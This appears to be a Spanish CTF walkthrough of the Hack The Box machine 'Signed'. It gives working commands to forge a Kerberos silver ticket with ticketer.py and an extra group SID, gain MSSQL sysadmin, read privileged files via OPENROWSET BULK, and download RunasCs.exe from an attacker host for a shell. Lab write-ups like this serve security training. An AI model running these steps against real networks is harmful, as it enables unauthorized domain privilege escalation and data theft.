Obtener Silver Ticket#

Ahora que estamos con el usuario mssqlsvc vemos que no tenemos ningún tipo de permiso especial. Pero podemos tratar de con ticketer generat Silver tickets para usuarios del sistema.

Para generar el ticket necesitamos:

  • Hash NT
  • Indicar el dominio y el SID del dominio
  • Indicar el spn de nuestro usuario
  • Indicar el usuario víctima

Generar hash NT - cyberchef#

Como tenemos la contraseña del usuario MSSQLsvc podemos tratar de generar el HASH NT partiendo de la contraseña usando cyberchef.

Entonces el hash NT es EF699384C3285C54128A3EE1DDB1A0CC.

Obtener SID del servidor#

En este caso no hemos podido identificar el SID del dominio a través de LDAP ya que no existe esa posibilidad, pero si que podemos enumerar MSSQL para obtener el SID en formato HEX.

0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000

Ahora tenemos el SID en hexadecimal pero lo necesitamos en formato SID-1-…. con lo cual usando este script obtendremos el SID del dominio.

#!/usr/bin/env python3
# hex2sid.py - convierte SID en hex (sin 0x) a formato S-1-...

import sys, struct

if len(sys.argv) != 2:
    print("Usage: python3 hex2sid.py <hexstring>")
    print("Example: python3 hex2sid.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000")
    sys.exit(1)

h = sys.argv[1].lower().strip()
if h.startswith("0x"):
    h = h[2:]
b = bytes.fromhex(h)

# SID structure:
# byte 0: revision
# byte 1: subauthority count
# bytes 2-7: identifier authority (big endian)
# then subauthorities: little endian 4 bytes each
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], 'big')
subs = []
offset = 8
for i in range(subc):
    subs.append(struct.unpack('<I', b[offset:offset+4])[0])
    offset += 4

sid = "S-{}-{}".format(rev, ident)
if subs:
    sid += "-" + "-".join(str(x) for x in subs)
print(sid)

python3 obtener_sid.py 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000

Enumerar permisos grupo IT#

Mirando los permisos no encuentro nada interesante pero si enumeramos los objetos disponibles vemos que existe el grupo SIGNED\IT.

SELECT name, sid, type_desc FROM sys.server_principals WHERE name LIKE '%SIGNED%';

Y si miramos si tiene permisos sysadmin vemos que si que los tiene:

SELECT IS_SRVROLEMEMBER('sysadmin', 'SIGNED\IT') AS is_it_sysadmin;

Generar Silver Ticket con los permisos del grupo IT - ticketer.py#

Y ahora ejecutamos el ticketer añadiendo el nuevo SID con -extra-sid.

ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain SIGNED -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -extra-sid S-1-5-21-4088429403-1159899800-2753317549-1105 -spn "MSSQLSvc/dc01.signed.htb" Administrator

Luego lo exportamos a la variable KRB5CCNAME y nos logeamos con MSSQLCLIENT.

export KRB5CCNAME=/home/borhub/Workspace/HTB/Signed/CONTENT/Administrator.ccache

mssqlclient.py 'signed/Administrator@dc01.signed.htb' -k -no-pass -dc-ip 10.129.223.234

Y ahora si que somos sysadmin:

SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');

Escalada de Privilegios#

Para escalada estuve enumerando la máquina usando winpeas y otras herramientas pero no saque nada de esta enumeración.

Leyendo archivos sensibles - BULK#

Algo que me parecía interesante es que cuando ejecutaba la syntaxis de leer archivos BULK en sqlcmd desde el contexto de de mssqlsvc si me estaba funcionando.

sqlcmd -Q "select * from OpenRowset(BULK 'C:\Windows\System32\drivers\etc\hosts',SINGLE_CLOB) AS MyFile;"

Pero, que es lo que me pasaba si ejecutaba el mismo comando desde el contexto del usuario al que le habíamos obtenido el TGS?:

Pues al ejecutar el lector de archivos estaba recibiendo un error de impersonate/privilegios.

Esto ocurre porque realmente no tenemos los permisos suficientes para impersonar al usuario Administrator.

select * from OpenRowset(BULK 'C:\Windows\System32\drivers\etc\hosts',SINGLE_CLOB) AS MyFile;

Entonces el siguiente paso que doy es cambiar al usuario que estoy impersonando por mssqlsvc (También indicando el –user-id) y pruebo que pueda leer archivos.

ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain SIGNED -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -extra-sid S-1-5-21-4088429403-1159899800-2753317549-1105 -spn "MSSQLsvc/dc01.signed.htb" mssqlsvc -user-id 1103

export KRB5CCNAME=/home/borhub/Workspace/HTB/Signed/CONTENT/mssqlsvc.ccache


mssqlclient.py 'signed/mssqlsvc@dc01.signed.htb' -k -no-pass -dc-ip 10.129.79.18

Como he visto que ahora SI que me ha funcionado la lectura de archivos pruebo a leer la root.txt (Para esto es necesario tener permisos de Domain Admin):

select * from OpenRowset(BULK 'C:\Users\Administrator\desktop\root.txt',SINGLE_CLOB) AS MyFile;

Y vemos que hemos sido capaces de leer los archivos de Administrador cosa que en un principio no debería de ser posible, aunque averiguaremos esto luego de conseguir la shell.

Shell como Administrator - RunasCs#

Como ahora tenemos ya la contraseña de administrador vamos a generar una shell como administrador usando RunasCs.

Entonces nos descargamos el ejecutable a la maquina con Invoke-WebRequest.

Invoke-WebRequest -Uri http://10.10.15.19:8000/RunasCs.exe -OutFile "RunasCs.exe"
